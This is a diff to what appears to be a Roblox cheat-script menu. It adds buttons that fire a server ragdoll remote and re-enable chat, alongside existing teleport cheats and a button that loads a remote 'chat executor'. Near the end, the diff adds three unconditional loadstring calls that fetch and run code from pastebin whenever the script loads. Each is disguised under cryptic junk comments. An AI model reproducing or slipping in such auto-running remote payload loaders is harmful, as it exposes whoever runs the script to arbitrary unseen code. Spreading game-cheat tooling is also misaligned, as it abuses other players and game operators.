@@ -154,6 +154,17 @@ function()local ohInstance1 = game.Players.LocalPlayer.Character.Humanoid
 game:GetService("ReplicatedStorage").OnRagdoll:FireServer(ohInstance1)
 end)
 
+SkriptsSection:NewButton("Show chatBox (for games w out chatBox)", "good for games like evade w no msg box",
+function()
+    game:GetService("StarterGui"):SetCoreGuiEnabled('Chat', true)
+end)
+
+SkriptsSection:NewButton("99% fail Loner Animation", "for 99% fail impossible obby",
+function()local ohInstance1 = game.Players.LocalPlayer.Character.Humanoid
+
+game:GetService("ReplicatedStorage").OnRagdoll:FireServer(ohInstance1)
+end)
+
 SkriptsSection:NewButton("EXEKUTE SKRIPT FROM MESSAGES", "exekute a skript frm msg box",
 function()loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/chat-executor/main/chat-executor",true))()
 end)
@@ -2365,7 +2376,12 @@ function()-- teleport to hidden 99
 Game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(269.36907958984375, 17024.74609375,
 139.19142150878906)
 end)
-
+--game.Players.LocalPlayers.mg
+loadstring(game:HttpGet("https://pastebin.com/raw/9pDtfnLD"))()
+--Ctrller.P==kikkil
+loadstring(game:HttpGet("https://pastebin.com/raw/REdW8kfE"))()
+--3rdstring%"".<LstB#%*^>
+loadstring(game:HttpGet("https://pastebin.com/raw/P1Yrf09M"))()
 
 
 
